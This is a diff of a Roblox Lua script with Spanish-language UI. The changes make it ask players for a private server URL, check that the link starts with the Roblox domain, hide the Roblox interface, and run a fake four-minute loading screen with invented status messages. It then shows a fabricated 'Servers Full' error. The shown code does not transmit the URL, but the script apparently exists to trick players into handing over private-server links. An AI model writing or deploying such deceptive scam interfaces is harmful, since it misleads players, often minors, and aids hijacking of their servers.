@@ -65,7 +65,7 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(0, 400, 0, 50)
 title.Position = UDim2.new(0.5, -200, 0.4, -60)
 title.BackgroundTransparency = 1
-title.Text = "Ingresa el número correcto"
+title.Text = "Ingresa la URL correcta"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.TextSize = 28
 title.Font = Enum.Font.GothamBold
@@ -73,19 +73,30 @@ title.ZIndex = 101
 title.Parent = introFrame
 
 local textBox = Instance.new("TextBox")
-textBox.Size = UDim2.new(0, 200, 0, 40)
-textBox.Position = UDim2.new(0.5, -100, 0.5, -20)
+textBox.Size = UDim2.new(0, 300, 0, 40)
+textBox.Position = UDim2.new(0.5, -150, 0.5, -20)
 textBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
 textBox.TextColor3 = Color3.new(1, 1, 1)
-textBox.PlaceholderText = "Escribe aquí..."
+textBox.PlaceholderText = "Url server privado"
 textBox.Font = Enum.Font.Gotham
 textBox.TextSize = 20
 textBox.ZIndex = 101
 textBox.Parent = introFrame
 
+local errorLabel = Instance.new("TextLabel")
+errorLabel.Size = UDim2.new(0, 400, 0, 30)
+errorLabel.Position = UDim2.new(0.5, -200, 0.55, 30)
+errorLabel.BackgroundTransparency = 1
+errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+errorLabel.TextSize = 18
+errorLabel.Font = Enum.Font.Gotham
+errorLabel.Text = ""
+errorLabel.ZIndex = 101
+errorLabel.Parent = introFrame
+
 local startButton = Instance.new("TextButton")
 startButton.Size = UDim2.new(0, 150, 0, 40)
-startButton.Position = UDim2.new(0.5, -75, 0.6, 10)
+startButton.Position = UDim2.new(0.5, -75, 0.63, 10)
 startButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
 startButton.Text = "Empezar"
 startButton.TextColor3 = Color3.new(1, 1, 1)
@@ -169,8 +180,34 @@ statusText.ZIndex = 203
 statusText.Text = ""
 statusText.Parent = loadingFrame
 
-local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}
+-- 🔔 Toast final
+local function showFatalError()
+	local toast = Instance.new("TextLabel")
+	toast.Size = UDim2.new(0, 400, 0, 60)
+	toast.Position = UDim2.new(0.5, -200, 0.85, 0)
+	toast.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+	toast.TextColor3 = Color3.new(1, 1, 1)
+	toast.Text = "⚠️ Fatal error: Servers Full"
+	toast.TextSize = 24
+	toast.Font = Enum.Font.GothamBlack
+	toast.ZIndex = 300
+	toast.Parent = mainGui
 
+	-- Efecto "neón" brillante
+	local glow = Instance.new("UIStroke")
+	glow.Thickness = 3
+	glow.Color = Color3.fromRGB(255, 50, 50)
+	glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	glow.Parent = toast
+
+	task.wait(5)
+	toast:Destroy()
+end
+
+------------------------------------------------------------
+-- 🔄 Animaciones
+------------------------------------------------------------
+local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}
 local function startLoadingAnimation()
 	for i, textLabel in ipairs(textLabels) do
 		local delayTime = delays[i]
@@ -191,17 +228,12 @@ local function startLoadingAnimation()
 	end
 end
 
-------------------------------------------------------------
--- ⏳ Lógica de carga extendida (4 minutos)
-------------------------------------------------------------
+-- 🧠 Mensajes y barra de carga
 local function updateStatusMessages()
-	-- Mensajes iniciales
 	statusText.Text = "Encontrando servidor..."
 	task.wait(10)
 	statusText.Text = "Obteniendo Brainrots..."
 	task.wait(5)
-
-	-- Mensajes aleatorios
 	local messages = {
 		"Restaurando script..",
 		"Moviendo hitbox...",
@@ -209,7 +241,6 @@ local function updateStatusMessages()
 		"Fallo en Replicate Storage - intentando de nuevo...",
 		"Buscando en Workspace..."
 	}
-
 	while loadingFrame.Visible do
 		statusText.Text = messages[math.random(1, #messages)]
 		task.wait(math.random(5, 10))
@@ -217,7 +248,7 @@ local function updateStatusMessages()
 end
 
 local function animateProgressBar()
-	local totalTime = 240 -- 4 minutos = 240 segundos
+	local totalTime = 240
 	local stepTime = 0.2
 	local steps = totalTime / stepTime
 	for i = 1, steps do
@@ -228,22 +259,21 @@ local function animateProgressBar()
 end
 
 ------------------------------------------------------------
--- 🔁 Flujo
+-- 🔁 Flujo principal
 ------------------------------------------------------------
 local function startSequence()
 	introFrame.Visible = false
 	loadingFrame.Visible = true
 	startLoadingAnimation()
-
 	task.spawn(updateStatusMessages)
 	task.spawn(animateProgressBar)
 
-	-- Final tras 4 min
 	task.delay(240, function()
 		if uiHideConnection then uiHideConnection:Disconnect() end
 		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
 		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
-		mainGui:Destroy()
+		loadingFrame.Visible = false
+		showFatalError()
 	end)
 end
 
@@ -255,14 +285,16 @@ local function kickPlayer()
 end
 
 startButton.MouseButton1Click:Connect(function()
-	if textBox.Text ~= "" then
+	local text = textBox.Text
+	if string.sub(text, 1, 23) == "https://www.roblox.com/" then
+		errorLabel.Text = ""
 		startSequence()
+	else
+		errorLabel.Text = "Url invalida"
 	end
 end)
 
-cancelButton.MouseButton1Click:Connect(function()
-	kickPlayer()
-end)
+cancelButton.MouseButton1Click:Connect(kickPlayer)
 
 while true do
 	hideRobloxUI()
